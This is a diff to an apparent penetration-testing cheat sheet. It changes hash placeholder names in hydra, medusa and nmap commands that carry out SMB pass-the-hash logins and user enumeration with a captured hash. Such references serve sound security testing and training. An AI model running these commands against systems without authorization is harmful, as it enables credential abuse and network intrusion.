@@ -27,9 +27,9 @@ done
 
 - Pass the Hash
 
-`$ hydra -l <username> -p <ntlm_hash> -m "" <IP> smb`
+`$ hydra -l <username> -p <nt_hash> -m "" <IP> smb`
 
-`$ hydra -l <username> -p <lm_hash>:<ntlm_hash> <IP> -m "LocalHash" smb`
+`$ hydra -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb`
 
 ## 03 - Medusa
 
@@ -39,7 +39,7 @@ TODO: Show syntax for brute forcing SMB with Medusa
 
 - Pass the Hash
 
-`$ medusa -u <username> -p <lm_hash>:<ntlm_hash> -h <IP> -M smbnt -m PASS:HASH`
+`$ medusa -u <username> -p <lm_hash>:<nt_hash> -h <IP> -M smbnt -m PASS:HASH`
 
 ## 04 - Metasploit
 
@@ -94,4 +94,4 @@ msf auxiliary(scanner/smb/smb_login) > run
 
 - Pass the Hash
 
-`$ sudo nmap -p U:137,T:139 --script smb-enum-groups,smb-enum-users --script-args 'smbuser=<username>,smbhash=<ntlm_hash>' <IP>/<CIDR>`
+`$ sudo nmap -p U:137,T:139 --script smb-enum-groups,smb-enum-users --script-args 'smbuser=<username>,smbhash=<nt_hash>' <IP>/<CIDR>`
